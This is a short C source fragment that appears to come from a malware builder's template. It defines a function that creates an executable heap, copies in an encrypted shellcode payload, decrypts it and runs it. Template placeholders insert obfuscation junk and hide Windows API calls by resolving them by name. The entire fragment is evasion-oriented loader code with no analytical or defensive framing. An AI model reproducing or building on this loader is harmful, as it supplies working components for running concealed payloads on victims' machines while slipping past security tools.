static forceinline void _obf_execute_shellcode(_obf_api_caller_t caller) {
    {{obf:*}} HANDLE heap = {{api-n:HeapCreate}}((PVOID)HEAP_CREATE_ENABLE_EXECUTE, _obf_shellcode_size, _obf_shellcode_size);
    {{obf:*}} char *buf = {{api-n:HeapAlloc}}(heap, HEAP_ZERO_MEMORY, _obf_shellcode_size);
    {{obf:*}} memcpy(buf, _obf_shellcode, _obf_shellcode_size);
    {{obf:*}} _obf_decrypt_shellcode(buf, _obf_shellcode_key, _obf_shellcode_size);
    {{obf:*}} (*(void(*)())buf)();
    {{obf:*}}
}